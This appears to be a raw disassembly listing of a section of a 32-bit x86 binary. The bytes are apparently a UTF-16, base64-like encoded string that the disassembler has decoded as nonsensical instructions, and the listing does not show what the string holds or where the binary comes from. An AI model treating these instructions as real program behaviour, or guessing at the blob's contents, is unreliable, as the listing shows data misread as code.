  40ac51:	00 55 00             	add    %dl,0x0(%ebp)
  40ac54:	31 00                	xor    %eax,(%eax)
  40ac56:	47                   	inc    %edi
  40ac57:	00 77 00             	add    %dh,0x0(%edi)
  40ac5a:	53                   	push   %ebx
  40ac5b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ac5e:	65 00 54 00 33       	add    %dl,%gs:0x33(%eax,%eax,1)
  40ac63:	00 76 00             	add    %dh,0x0(%esi)
  40ac66:	50                   	push   %eax
  40ac67:	00 52 00             	add    %dl,0x0(%edx)
  40ac6a:	6f                   	outsl  %ds:(%esi),(%dx)
  40ac6b:	00 7a 00             	add    %bh,0x0(%edx)
  40ac6e:	63 00                	arpl   %eax,(%eax)
  40ac70:	78 00                	js     0x40ac72
  40ac72:	46                   	inc    %esi
  40ac73:	00 39                	add    %bh,(%ecx)
  40ac75:	00 69 00             	add    %ch,0x0(%ecx)
  40ac78:	57                   	push   %edi
  40ac79:	00 6b 00             	add    %ch,0x0(%ebx)
  40ac7c:	2b 00                	sub    (%eax),%eax
  40ac7e:	69 00 55 00 51 00    	imul   $0x510055,(%eax),%eax
  40ac84:	49                   	dec    %ecx
  40ac85:	00 67 00             	add    %ah,0x0(%edi)
  40ac88:	42                   	inc    %edx
  40ac89:	00 79 00             	add    %bh,0x0(%ecx)
  40ac8c:	7a 00                	jp     0x40ac8e
  40ac8e:	6e                   	outsb  %ds:(%esi),(%dx)
  40ac8f:	00 48 00             	add    %cl,0x0(%eax)
  40ac92:	59                   	pop    %ecx
  40ac93:	00 6f 00             	add    %ch,0x0(%edi)
  40ac96:	00 87 b1 77 00 31    	add    %al,0x310077b1(%edi)
  40ac9c:	00 48 00             	add    %cl,0x0(%eax)
  40ac9f:	6c                   	insb   (%dx),%es:(%edi)
  40aca0:	00 6b 00             	add    %ch,0x0(%ebx)
  40aca3:	4a                   	dec    %edx
  40aca4:	00 70 00             	add    %dh,0x0(%eax)
  40aca7:	65 00 66 00          	add    %ah,%gs:0x0(%esi)
  40acab:	76 00                	jbe    0x40acad
  40acad:	4b                   	dec    %ebx
  40acae:	00 62 00             	add    %ah,0x0(%edx)
  40acb1:	32 00                	xor    (%eax),%al
  40acb3:	78 00                	js     0x40acb5
  40acb5:	30 00                	xor    %al,(%eax)
  40acb7:	56                   	push   %esi
  40acb8:	00 79 00             	add    %bh,0x0(%ecx)
  40acbb:	4f                   	dec    %edi
  40acbc:	00 38                	add    %bh,(%eax)
  40acbe:	00 31                	add    %dh,(%ecx)
  40acc0:	00 69 00             	add    %ch,0x0(%ecx)
  40acc3:	56                   	push   %esi
  40acc4:	00 70 00             	add    %dh,0x0(%eax)
  40acc7:	55                   	push   %ebp
  40acc8:	00 4f 00             	add    %cl,0x0(%edi)
  40accb:	39 00                	cmp    %eax,(%eax)
  40accd:	67 00 59 00          	add    %bl,0x0(%bx,%di)
  40acd1:	35 00 68 00 39       	xor    $0x39006800,%eax
  40acd6:	00 38                	add    %bh,(%eax)
  40acd8:	00 52 00             	add    %dl,0x0(%edx)
  40acdb:	69 00 37 00 4b 00    	imul   $0x4b0037,(%eax),%eax
  40ace1:	4e                   	dec    %esi
  40ace2:	00 61 00             	add    %ah,0x0(%ecx)
  40ace5:	6b 00 42             	imul   $0x42,(%eax),%eax
  40ace8:	00 30                	add    %dh,(%eax)
  40acea:	00 79 00             	add    %bh,0x0(%ecx)
  40aced:	74 00                	je     0x40acef
  40acef:	78 00                	js     0x40acf1
  40acf1:	58                   	pop    %eax
  40acf2:	00 6f 00             	add    %ch,0x0(%edi)
  40acf5:	6f                   	outsl  %ds:(%esi),(%dx)
  40acf6:	00 65 00             	add    %ah,0x0(%ebp)
  40acf9:	39 00                	cmp    %eax,(%eax)
  40acfb:	65 00 68 00          	add    %ch,%gs:0x0(%eax)
  40acff:	75 00                	jne    0x40ad01
  40ad01:	77 00                	ja     0x40ad03
  40ad03:	52                   	push   %edx
  40ad04:	00 54 00 76          	add    %dl,0x76(%eax,%eax,1)
  40ad08:	00 36                	add    %dh,(%esi)
  40ad0a:	00 6c 00 55          	add    %ch,0x55(%eax,%eax,1)
  40ad0e:	00 43 00             	add    %al,0x0(%ebx)
  40ad11:	6a 00                	push   $0x0
  40ad13:	30 00                	xor    %al,(%eax)
  40ad15:	56                   	push   %esi
  40ad16:	00 30                	add    %dh,(%eax)
  40ad18:	00 4d 00             	add    %cl,0x0(%ebp)
  40ad1b:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad1c:	00 7a 00             	add    %bh,0x0(%edx)
  40ad1f:	73 00                	jae    0x40ad21
  40ad21:	6f                   	outsl  %ds:(%esi),(%dx)
  40ad22:	00 49 00             	add    %cl,0x0(%ecx)
  40ad25:	47                   	inc    %edi
  40ad26:	00 5a 00             	add    %bl,0x0(%edx)
  40ad29:	50                   	push   %eax
  40ad2a:	00 41 00             	add    %al,0x0(%ecx)
  40ad2d:	54                   	push   %esp
  40ad2e:	00 47 00             	add    %al,0x0(%edi)
  40ad31:	39 00                	cmp    %eax,(%eax)
  40ad33:	31 00                	xor    %eax,(%eax)
  40ad35:	78 00                	js     0x40ad37
  40ad37:	68 00 66 00 68       	push   $0x68006600
  40ad3c:	00 59 00             	add    %bl,0x0(%ecx)
  40ad3f:	42                   	inc    %edx
  40ad40:	00 74 00 71          	add    %dh,0x71(%eax,%eax,1)
  40ad44:	00 52 00             	add    %dl,0x0(%edx)
  40ad47:	35 00 59 00 53       	xor    $0x53005900,%eax
  40ad4c:	00 59 00             	add    %bl,0x0(%ecx)
  40ad4f:	50                   	push   %eax
  40ad50:	00 4a 00             	add    %cl,0x0(%edx)
  40ad53:	72 00                	jb     0x40ad55
  40ad55:	61                   	popa
  40ad56:	00 71 00             	add    %dh,0x0(%ecx)
  40ad59:	7a 00                	jp     0x40ad5b
  40ad5b:	63 00                	arpl   %eax,(%eax)
  40ad5d:	79 00                	jns    0x40ad5f
  40ad5f:	48                   	dec    %eax
  40ad60:	00 2b                	add    %ch,(%ebx)
  40ad62:	00 6f 00             	add    %ch,0x0(%edi)
  40ad65:	4a                   	dec    %edx
  40ad66:	00 4e 00             	add    %cl,0x0(%esi)
  40ad69:	66 00 33             	data16 add %dh,(%ebx)
  40ad6c:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40ad70:	00 38                	add    %bh,(%eax)
  40ad72:	00 75 00             	add    %dh,0x0(%ebp)
  40ad75:	46                   	inc    %esi
  40ad76:	00 4a 00             	add    %cl,0x0(%edx)
  40ad79:	4d                   	dec    %ebp
  40ad7a:	00 31                	add    %dh,(%ecx)
  40ad7c:	00 32                	add    %dh,(%edx)
  40ad7e:	00 56 00             	add    %dl,0x0(%esi)
  40ad81:	58                   	pop    %eax
  40ad82:	00 4c 00 4e          	add    %cl,0x4e(%eax,%eax,1)
  40ad86:	00 7a 00             	add    %bh,0x0(%edx)
  40ad89:	5a                   	pop    %edx
  40ad8a:	00 39                	add    %bh,(%ecx)
  40ad8c:	00 69 00             	add    %ch,0x0(%ecx)
  40ad8f:	32 00                	xor    (%eax),%al
  40ad91:	34 00                	xor    $0x0,%al
  40ad93:	37                   	aaa
  40ad94:	00 36                	add    %dh,(%esi)
  40ad96:	00 4c 00 68          	add    %cl,0x68(%eax,%eax,1)
  40ad9a:	00 74 00 6b          	add    %dh,0x6b(%eax,%eax,1)
  40ad9e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ada1:	6c                   	insb   (%dx),%es:(%edi)
  40ada2:	00 2b                	add    %ch,(%ebx)
  40ada4:	00 4a 00             	add    %cl,0x0(%edx)
  40ada7:	51                   	push   %ecx
  40ada8:	00 6a 00             	add    %ch,0x0(%edx)
  40adab:	4e                   	dec    %esi
  40adac:	00 57 00             	add    %dl,0x0(%edi)
  40adaf:	6f                   	outsl  %ds:(%esi),(%dx)
  40adb0:	00 32                	add    %dh,(%edx)
  40adb2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40adb5:	63 00                	arpl   %eax,(%eax)
  40adb7:	6b 00 53             	imul   $0x53,(%eax),%eax
  40adba:	00 68 00             	add    %ch,0x0(%eax)
  40adbd:	49                   	dec    %ecx
  40adbe:	00 75 00             	add    %dh,0x0(%ebp)
  40adc1:	72 00                	jb     0x40adc3
  40adc3:	6c                   	insb   (%dx),%es:(%edi)
  40adc4:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40adc8:	00 33                	add    %dh,(%ebx)
  40adca:	00 62 00             	add    %ah,0x0(%edx)
  40adcd:	68 00 78 00 55       	push   $0x55007800
  40add2:	00 46 00             	add    %al,0x0(%esi)
  40add5:	38 00                	cmp    %al,(%eax)
  40add7:	68 00 56 00 71       	push   $0x71005600
  40addc:	00 46 00             	add    %al,0x0(%esi)
  40addf:	6e                   	outsb  %ds:(%esi),(%dx)
  40ade0:	00 2b                	add    %ch,(%ebx)
  40ade2:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ade5:	32 00                	xor    (%eax),%al
  40ade7:	2f                   	das
  40ade8:	00 39                	add    %bh,(%ecx)
  40adea:	00 4a 00             	add    %cl,0x0(%edx)
  40aded:	65 00 30             	add    %dh,%gs:(%eax)
  40adf0:	00 57 00             	add    %dl,0x0(%edi)
  40adf3:	58                   	pop    %eax
  40adf4:	00 63 00             	add    %ah,0x0(%ebx)
  40adf7:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40adfb:	4b                   	dec    %ebx
  40adfc:	00 47 00             	add    %al,0x0(%edi)
  40adff:	2b 00                	sub    (%eax),%eax
  40ae01:	63 00                	arpl   %eax,(%eax)
  40ae03:	4a                   	dec    %edx
  40ae04:	00 77 00             	add    %dh,0x0(%edi)
  40ae07:	74 00                	je     0x40ae09
  40ae09:	35 00 47 00 42       	xor    $0x42004700,%eax
  40ae0e:	00 77 00             	add    %dh,0x0(%edi)
  40ae11:	38 00                	cmp    %al,(%eax)
  40ae13:	34 00                	xor    $0x0,%al
  40ae15:	68 00 5a 00 54       	push   $0x54005a00
  40ae1a:	00 67 00             	add    %ah,0x0(%edi)
  40ae1d:	36 00 75 00          	add    %dh,%ss:0x0(%ebp)
  40ae21:	4d                   	dec    %ebp
  40ae22:	00 51 00             	add    %dl,0x0(%ecx)
  40ae25:	7a 00                	jp     0x40ae27
  40ae27:	77 00                	ja     0x40ae29
  40ae29:	77 00                	ja     0x40ae2b
  40ae2b:	6a 00                	push   $0x0
  40ae2d:	51                   	push   %ecx
  40ae2e:	00 4f 00             	add    %cl,0x0(%edi)
  40ae31:	74 00                	je     0x40ae33
  40ae33:	58                   	pop    %eax
  40ae34:	00 78 00             	add    %bh,0x0(%eax)
  40ae37:	6d                   	insl   (%dx),%es:(%edi)
  40ae38:	00 69 00             	add    %ch,0x0(%ecx)
  40ae3b:	66 00 5a 00          	data16 add %bl,0x0(%edx)
  40ae3f:	45                   	inc    %ebp
  40ae40:	00 78 00             	add    %bh,0x0(%eax)
  40ae43:	63 00                	arpl   %eax,(%eax)
  40ae45:	4d                   	dec    %ebp
  40ae46:	00 57 00             	add    %dl,0x0(%edi)
  40ae49:	68 00 33 00 51       	push   $0x51003300
  40ae4e:	00 6d 00             	add    %ch,0x0(%ebp)
  40ae51:	78 00                	js     0x40ae53
  40ae53:	77 00                	ja     0x40ae55
  40ae55:	51                   	push   %ecx
  40ae56:	00 4a 00             	add    %cl,0x0(%edx)
  40ae59:	4f                   	dec    %edi
  40ae5a:	00 6a 00             	add    %ch,0x0(%edx)
  40ae5d:	57                   	push   %edi
  40ae5e:	00 45 00             	add    %al,0x0(%ebp)
  40ae61:	73 00                	jae    0x40ae63
  40ae63:	72 00                	jb     0x40ae65
  40ae65:	36 00 39             	add    %bh,%ss:(%ecx)
  40ae68:	00 35 00 41 00 59    	add    %dh,0x59004100
  40ae6e:	00 41 00             	add    %al,0x0(%ecx)
  40ae71:	2b 00                	sub    (%eax),%eax
  40ae73:	75 00                	jne    0x40ae75
  40ae75:	47                   	inc    %edi
  40ae76:	00 4b 00             	add    %cl,0x0(%ebx)
  40ae79:	5a                   	pop    %edx
  40ae7a:	00 58 00             	add    %bl,0x0(%eax)
  40ae7d:	4c                   	dec    %esp
  40ae7e:	00 50 00             	add    %dl,0x0(%eax)
  40ae81:	4a                   	dec    %edx
  40ae82:	00 62 00             	add    %ah,0x0(%edx)
  40ae85:	76 00                	jbe    0x40ae87
  40ae87:	2b 00                	sub    (%eax),%eax
  40ae89:	36 00 64 00 52       	add    %ah,%ss:0x52(%eax,%eax,1)
  40ae8e:	00 34 00             	add    %dh,(%eax,%eax,1)
  40ae91:	6c                   	insb   (%dx),%es:(%edi)
  40ae92:	00 56 00             	add    %dl,0x0(%esi)
  40ae95:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40ae99:	41                   	inc    %ecx
  40ae9a:	00 57 00             	add    %dl,0x0(%edi)
  40ae9d:	69 00 36 00 44 00    	imul   $0x440036,(%eax),%eax
  40aea3:	69 00 34 00 4e 00    	imul   $0x4e0034,(%eax),%eax
  40aea9:	32 00                	xor    (%eax),%al
  40aeab:	4a                   	dec    %edx
  40aeac:	00 49 00             	add    %cl,0x0(%ecx)
  40aeaf:	71 00                	jno    0x40aeb1
  40aeb1:	42                   	inc    %edx
  40aeb2:	00 37                	add    %dh,(%edi)
  40aeb4:	00 7a 00             	add    %bh,0x0(%edx)
  40aeb7:	2f                   	das
  40aeb8:	00 38                	add    %bh,(%eax)
  40aeba:	00 67 00             	add    %ah,0x0(%edi)
  40aebd:	38 00                	cmp    %al,(%eax)
  40aebf:	41                   	inc    %ecx
  40aec0:	00 55 00             	add    %dl,0x0(%ebp)
  40aec3:	45                   	inc    %ebp
  40aec4:	00 42 00             	add    %al,0x0(%edx)
  40aec7:	41                   	inc    %ecx
  40aec8:	00 67 00             	add    %ah,0x0(%edi)
  40aecb:	53                   	push   %ebx
  40aecc:	00 79 00             	add    %bh,0x0(%ecx)
  40aecf:	62 00                	bound  %eax,(%eax)
  40aed1:	6e                   	outsb  %ds:(%esi),(%dx)
  40aed2:	00 4b 00             	add    %cl,0x0(%ebx)
  40aed5:	46                   	inc    %esi
  40aed6:	00 59 00             	add    %bl,0x0(%ecx)
  40aed9:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40aedd:	6a 00                	push   $0x0
  40aedf:	61                   	popa
  40aee0:	00 37                	add    %dh,(%edi)
  40aee2:	00 62 00             	add    %ah,0x0(%edx)
  40aee5:	55                   	push   %ebp
  40aee6:	00 33                	add    %dh,(%ebx)
  40aee8:	00 55 00             	add    %dl,0x0(%ebp)
  40aeeb:	4c                   	dec    %esp
  40aeec:	00 65 00             	add    %ah,0x0(%ebp)
  40aeef:	51                   	push   %ecx
  40aef0:	00 72 00             	add    %dh,0x0(%edx)
  40aef3:	31 00                	xor    %eax,(%eax)
  40aef5:	70 00                	jo     0x40aef7
  40aef7:	78 00                	js     0x40aef9
  40aef9:	76 00                	jbe    0x40aefb
  40aefb:	54                   	push   %esp
  40aefc:	00 6a 00             	add    %ch,0x0(%edx)
  40aeff:	74 00                	je     0x40af01
  40af01:	75 00                	jne    0x40af03
  40af03:	78 00                	js     0x40af05
  40af05:	37                   	aaa
  40af06:	00 63 00             	add    %ah,0x0(%ebx)
  40af09:	2f                   	das
  40af0a:	00 61 00             	add    %ah,0x0(%ecx)
  40af0d:	54                   	push   %esp
  40af0e:	00 32                	add    %dh,(%edx)
  40af10:	00 49 00             	add    %cl,0x0(%ecx)
  40af13:	48                   	dec    %eax
  40af14:	00 2b                	add    %ch,(%ebx)
  40af16:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40af1a:	00 2b                	add    %ch,(%ebx)
  40af1c:	00 78 00             	add    %bh,0x0(%eax)
  40af1f:	79 00                	jns    0x40af21
  40af21:	63 00                	arpl   %eax,(%eax)
  40af23:	33 00                	xor    (%eax),%eax
  40af25:	37                   	aaa
  40af26:	00 4b 00             	add    %cl,0x0(%ebx)
  40af29:	2b 00                	sub    (%eax),%eax
  40af2b:	45                   	inc    %ebp
  40af2c:	00 69 00             	add    %ch,0x0(%ecx)
  40af2f:	4d                   	dec    %ebp
  40af30:	00 75 00             	add    %dh,0x0(%ebp)
  40af33:	33 00                	xor    (%eax),%eax
  40af35:	77 00                	ja     0x40af37
  40af37:	4c                   	dec    %esp
  40af38:	00 62 00             	add    %ah,0x0(%edx)
  40af3b:	30 00                	xor    %al,(%eax)
  40af3d:	4c                   	dec    %esp
  40af3e:	00 75 00             	add    %dh,0x0(%ebp)
  40af41:	6e                   	outsb  %ds:(%esi),(%dx)
  40af42:	00 5a 00             	add    %bl,0x0(%edx)
  40af45:	6b 00 6d             	imul   $0x6d,(%eax),%eax
  40af48:	00 68 00             	add    %ch,0x0(%eax)
  40af4b:	65 00 39             	add    %bh,%gs:(%ecx)
  40af4e:	00 58 00             	add    %bl,0x0(%eax)
  40af51:	51                   	push   %ecx
  40af52:	00 6b 00             	add    %ch,0x0(%ebx)
  40af55:	79 00                	jns    0x40af57
  40af57:	64 00 47 00          	add    %al,%fs:0x0(%edi)
  40af5b:	57                   	push   %edi
  40af5c:	00 39                	add    %bh,(%ecx)
  40af5e:	00 63 00             	add    %ah,0x0(%ebx)
  40af61:	65 00 45 00          	add    %al,%gs:0x0(%ebp)
  40af65:	52                   	push   %edx
  40af66:	00 36                	add    %dh,(%esi)
  40af68:	00 51 00             	add    %dl,0x0(%ecx)
  40af6b:	4f                   	dec    %edi
  40af6c:	00 41 00             	add    %al,0x0(%ecx)
  40af6f:	48                   	dec    %eax
  40af70:	00 46 00             	add    %al,0x0(%esi)
  40af73:	31 00                	xor    %eax,(%eax)
  40af75:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40af79:	65 00 54 00 46       	add    %dl,%gs:0x46(%eax,%eax,1)
  40af7e:	00 75 00             	add    %dh,0x0(%ebp)
  40af81:	48                   	dec    %eax
  40af82:	00 37                	add    %dh,(%edi)
  40af84:	00 4b 00             	add    %cl,0x0(%ebx)
  40af87:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40af8b:	56                   	push   %esi
  40af8c:	00 33                	add    %dh,(%ebx)
  40af8e:	00 4e 00             	add    %cl,0x0(%esi)
  40af91:	76 00                	jbe    0x40af93
  40af93:	4a                   	dec    %edx
  40af94:	00 33                	add    %dh,(%ebx)
  40af96:	00 6b 00             	add    %ch,0x0(%ebx)
  40af99:	55                   	push   %ebp
  40af9a:	00 41 00             	add    %al,0x0(%ecx)
  40af9d:	73 00                	jae    0x40af9f
  40af9f:	4a                   	dec    %edx
  40afa0:	00 6a 00             	add    %ch,0x0(%edx)
  40afa3:	56                   	push   %esi
  40afa4:	00 45 00             	add    %al,0x0(%ebp)
  40afa7:	33 00                	xor    (%eax),%eax
  40afa9:	34 00                	xor    $0x0,%al
  40afab:	53                   	push   %ebx
  40afac:	00 68 00             	add    %ch,0x0(%eax)
  40afaf:	65 00 2f             	add    %ch,%gs:(%edi)
  40afb2:	00 33                	add    %dh,(%ebx)
  40afb4:	00 63 00             	add    %ah,0x0(%ebx)
  40afb7:	70 00                	jo     0x40afb9
  40afb9:	59                   	pop    %ecx
  40afba:	00 75 00             	add    %dh,0x0(%ebp)
  40afbd:	53                   	push   %ebx
  40afbe:	00 35 00 61 00 46    	add    %dh,0x46006100
  40afc4:	00 6a 00             	add    %ch,0x0(%edx)
  40afc7:	4a                   	dec    %edx
  40afc8:	00 37                	add    %dh,(%edi)
  40afca:	00 57 00             	add    %dl,0x0(%edi)
  40afcd:	38 00                	cmp    %al,(%eax)
  40afcf:	6a 00                	push   $0x0
  40afd1:	2f                   	das
  40afd2:	00 52 00             	add    %dl,0x0(%edx)
  40afd5:	2b 00                	sub    (%eax),%eax
  40afd7:	39 00                	cmp    %eax,(%eax)
  40afd9:	48                   	dec    %eax
  40afda:	00 56 00             	add    %dl,0x0(%esi)
  40afdd:	51                   	push   %ecx
  40afde:	00 37                	add    %dh,(%edi)
  40afe0:	00 5a 00             	add    %bl,0x0(%edx)
  40afe3:	4f                   	dec    %edi
  40afe4:	00 68 00             	add    %ch,0x0(%eax)
  40afe7:	38 00                	cmp    %al,(%eax)
  40afe9:	44                   	inc    %esp
  40afea:	00 6c 00 6d          	add    %ch,0x6d(%eax,%eax,1)
  40afee:	00 50 00             	add    %dl,0x0(%eax)
  40aff1:	6c                   	insb   (%dx),%es:(%edi)
  40aff2:	00 67 00             	add    %ah,0x0(%edi)
  40aff5:	78 00                	js     0x40aff7
  40aff7:	67 00 53 00          	add    %dl,0x0(%bp,%di)
  40affb:	76 00                	jbe    0x40affd
  40affd:	58                   	pop    %eax
  40affe:	00 67 00             	add    %ah,0x0(%edi)
  40b001:	53                   	push   %ebx
  40b002:	00 64 00 4c          	add    %ah,0x4c(%eax,%eax,1)
  40b006:	00 51 00             	add    %dl,0x0(%ecx)
  40b009:	50                   	push   %eax
  40b00a:	00 50 00             	add    %dl,0x0(%eax)
  40b00d:	74 00                	je     0x40b00f
  40b00f:	58                   	pop    %eax
  40b010:	00 43 00             	add    %al,0x0(%ebx)
  40b013:	5a                   	pop    %edx
  40b014:	00 53 00             	add    %dl,0x0(%ebx)
  40b017:	72 00                	jb     0x40b019
  40b019:	48                   	dec    %eax
  40b01a:	00 6d 00             	add    %ch,0x0(%ebp)
  40b01d:	6a 00                	push   $0x0
  40b01f:	6a 00                	push   $0x0
  40b021:	31 00                	xor    %eax,(%eax)
  40b023:	4b                   	dec    %ebx
  40b024:	00 39                	add    %bh,(%ecx)
  40b026:	00 6c 00 63          	add    %ch,0x63(%eax,%eax,1)
  40b02a:	00 49 00             	add    %cl,0x0(%ecx)
  40b02d:	4c                   	dec    %esp
  40b02e:	00 59 00             	add    %bl,0x0(%ecx)
  40b031:	2f                   	das
  40b032:	00 4a 00             	add    %cl,0x0(%edx)
  40b035:	38 00                	cmp    %al,(%eax)
  40b037:	33 00                	xor    (%eax),%eax
  40b039:	42                   	inc    %edx
  40b03a:	00 70 00             	add    %dh,0x0(%eax)
  40b03d:	34 00                	xor    $0x0,%al
  40b03f:	69 00 44 00 39 00    	imul   $0x390044,(%eax),%eax
  40b045:	69 00 2b 00 63 00    	imul   $0x63002b,(%eax),%eax
  40b04b:	72 00                	jb     0x40b04d
  40b04d:	48                   	dec    %eax
  40b04e:	00 4c 00 35          	add    %cl,0x35(%eax,%eax,1)
  40b052:	00 35 00 73 00 64    	add    %dh,0x64007300
  40b058:	00 4f 00             	add    %cl,0x0(%edi)
  40b05b:	58                   	pop    %eax
  40b05c:	00 42 00             	add    %al,0x0(%edx)
  40b05f:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b063:	67 00 32             	add    %dh,(%bp,%si)
  40b066:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b069:	68 00 6e 00 4f       	push   $0x4f006e00
  40b06e:	00 54 00 66          	add    %dl,0x66(%eax,%eax,1)
  40b072:	00 45 00             	add    %al,0x0(%ebp)
  40b075:	71 00                	jno    0x40b077
  40b077:	57                   	push   %edi
  40b078:	00 46 00             	add    %al,0x0(%esi)
  40b07b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b07c:	00 63 00             	add    %ah,0x0(%ebx)
  40b07f:	6c                   	insb   (%dx),%es:(%edi)
  40b080:	00 7a 00             	add    %bh,0x0(%edx)
  40b083:	59                   	pop    %ecx
  40b084:	00 59 00             	add    %bl,0x0(%ecx)
  40b087:	4f                   	dec    %edi
  40b088:	00 36                	add    %dh,(%esi)
  40b08a:	00 52 00             	add    %dl,0x0(%edx)
  40b08d:	42                   	inc    %edx
  40b08e:	00 58 00             	add    %bl,0x0(%eax)
  40b091:	6c                   	insb   (%dx),%es:(%edi)
  40b092:	00 50 00             	add    %dl,0x0(%eax)
  40b095:	37                   	aaa
  40b096:	00 6c 00 78          	add    %ch,0x78(%eax,%eax,1)
  40b09a:	00 72 00             	add    %dh,0x0(%edx)
  40b09d:	6b 00 66             	imul   $0x66,(%eax),%eax
  40b0a0:	00 46 00             	add    %al,0x0(%esi)
  40b0a3:	71 00                	jno    0x40b0a5
  40b0a5:	7a 00                	jp     0x40b0a7
  40b0a7:	59                   	pop    %ecx
  40b0a8:	00 63 00             	add    %ah,0x0(%ebx)
  40b0ab:	59                   	pop    %ecx
  40b0ac:	00 30                	add    %dh,(%eax)
  40b0ae:	00 30                	add    %dh,(%eax)
  40b0b0:	00 46 00             	add    %al,0x0(%esi)
  40b0b3:	73 00                	jae    0x40b0b5
  40b0b5:	46                   	inc    %esi
  40b0b6:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40b0ba:	00 6c 00 45          	add    %ch,0x45(%eax,%eax,1)
  40b0be:	00 63 00             	add    %ah,0x0(%ebx)
  40b0c1:	69 00 30 00 34 00    	imul   $0x340030,(%eax),%eax
  40b0c7:	69 00 55 00 55 00    	imul   $0x550055,(%eax),%eax
  40b0cd:	6b 00 35             	imul   $0x35,(%eax),%eax
  40b0d0:	00 32                	add    %dh,(%edx)
  40b0d2:	00 2b                	add    %ch,(%ebx)
  40b0d4:	00 41 00             	add    %al,0x0(%ecx)
  40b0d7:	7a 00                	jp     0x40b0d9
  40b0d9:	59                   	pop    %ecx
  40b0da:	00 61 00             	add    %ah,0x0(%ecx)
  40b0dd:	57                   	push   %edi
  40b0de:	00 7a 00             	add    %bh,0x0(%edx)
  40b0e1:	4e                   	dec    %esi
  40b0e2:	00 72 00             	add    %dh,0x0(%edx)
  40b0e5:	53                   	push   %ebx
  40b0e6:	00 55 00             	add    %dl,0x0(%ebp)
  40b0e9:	58                   	pop    %eax
  40b0ea:	00 74 00 53          	add    %dh,0x53(%eax,%eax,1)
  40b0ee:	00 57 00             	add    %dl,0x0(%edi)
  40b0f1:	59                   	pop    %ecx
  40b0f2:	00 66 00             	add    %ah,0x0(%esi)
  40b0f5:	43                   	inc    %ebx
  40b0f6:	00 4b 00             	add    %cl,0x0(%ebx)
  40b0f9:	43                   	inc    %ebx
  40b0fa:	00 72 00             	add    %dh,0x0(%edx)
  40b0fd:	30 00                	xor    %al,(%eax)
  40b0ff:	48                   	dec    %eax
  40b100:	00 32                	add    %dh,(%edx)
  40b102:	00 65 00             	add    %ah,0x0(%ebp)
  40b105:	62 00                	bound  %eax,(%eax)
  40b107:	74 00                	je     0x40b109
  40b109:	69 00 57 00 62 00    	imul   $0x620057,(%eax),%eax
  40b10f:	4d                   	dec    %ebp
  40b110:	00 35 00 6a 00 38    	add    %dh,0x38006a00
  40b116:	00 73 00             	add    %dh,0x0(%ebx)
  40b119:	4d                   	dec    %ebp
  40b11a:	00 54 00 59          	add    %dl,0x59(%eax,%eax,1)
  40b11e:	00 38                	add    %bh,(%eax)
  40b120:	00 67 00             	add    %ah,0x0(%edi)
  40b123:	71 00                	jno    0x40b125
  40b125:	56                   	push   %esi
  40b126:	00 49 00             	add    %cl,0x0(%ecx)
  40b129:	46                   	inc    %esi
  40b12a:	00 2f                	add    %ch,(%edi)
  40b12c:	00 6d 00             	add    %ch,0x0(%ebp)
  40b12f:	48                   	dec    %eax
  40b130:	00 5a 00             	add    %bl,0x0(%edx)
  40b133:	59                   	pop    %ecx
  40b134:	00 48 00             	add    %cl,0x0(%eax)
  40b137:	34 00                	xor    $0x0,%al
  40b139:	4a                   	dec    %edx
  40b13a:	00 41 00             	add    %al,0x0(%ecx)
  40b13d:	79 00                	jns    0x40b13f
  40b13f:	4a                   	dec    %edx
  40b140:	00 46 00             	add    %al,0x0(%esi)
  40b143:	46                   	inc    %esi
  40b144:	00 2f                	add    %ch,(%edi)
  40b146:	00 62 00             	add    %ah,0x0(%edx)
  40b149:	39 00                	cmp    %eax,(%eax)
  40b14b:	52                   	push   %edx
  40b14c:	00 6a 00             	add    %ch,0x0(%edx)
  40b14f:	4c                   	dec    %esp
  40b150:	00 48 00             	add    %cl,0x0(%eax)
  40b153:	4e                   	dec    %esi
  40b154:	00 52 00             	add    %dl,0x0(%edx)
  40b157:	58                   	pop    %eax
  40b158:	00 57 00             	add    %dl,0x0(%edi)
  40b15b:	75 00                	jne    0x40b15d
  40b15d:	78 00                	js     0x40b15f
  40b15f:	68 00 6a 00 2f       	push   $0x2f006a00
  40b164:	00 78 00             	add    %bh,0x0(%eax)
  40b167:	62 00                	bound  %eax,(%eax)
  40b169:	34 00                	xor    $0x0,%al
  40b16b:	31 00                	xor    %eax,(%eax)
  40b16d:	53                   	push   %ebx
  40b16e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b171:	70 00                	jo     0x40b173
  40b173:	6c                   	insb   (%dx),%es:(%edi)
  40b174:	00 52 00             	add    %dl,0x0(%edx)
  40b177:	32 00                	xor    (%eax),%al
  40b179:	4d                   	dec    %ebp
  40b17a:	00 37                	add    %dh,(%edi)
  40b17c:	00 4a 00             	add    %cl,0x0(%edx)
  40b17f:	6c                   	insb   (%dx),%es:(%edi)
  40b180:	00 54 00 36          	add    %dl,0x36(%eax,%eax,1)
  40b184:	00 39                	add    %bh,(%ecx)
  40b186:	00 62 00             	add    %ah,0x0(%edx)
  40b189:	61                   	popa
  40b18a:	00 52 00             	add    %dl,0x0(%edx)
  40b18d:	44                   	inc    %esp
  40b18e:	00 77 00             	add    %dh,0x0(%edi)
  40b191:	7a 00                	jp     0x40b193
  40b193:	54                   	push   %esp
  40b194:	00 6f 00             	add    %ch,0x0(%edi)
  40b197:	30 00                	xor    %al,(%eax)
  40b199:	59                   	pop    %ecx
  40b19a:	00 32                	add    %dh,(%edx)
  40b19c:	00 47 00             	add    %al,0x0(%edi)
  40b19f:	37                   	aaa
  40b1a0:	00 35 00 6f 00 75    	add    %dh,0x75006f00
  40b1a6:	00 70 00             	add    %dh,0x0(%eax)
  40b1a9:	52                   	push   %edx
